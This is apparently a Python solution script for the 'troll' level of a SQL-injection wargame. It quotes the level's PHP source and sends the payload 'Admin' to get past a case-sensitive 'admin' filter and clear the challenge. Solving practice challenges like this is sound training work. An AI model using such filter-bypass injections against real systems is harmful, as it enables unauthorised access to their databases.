#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Troll

    if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match("/admin/", $_GET[id])) exit("HeHe");
    $query = "select id from prob_troll where id='{$_GET[id]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id'] == 'admin') solve("troll");
    """

    url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'id'
    payload = "Admin"

    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()

    if 'Clear!' in response:
        print('\nTROLL Clear!')


if __name__ == '__main__':
    main()
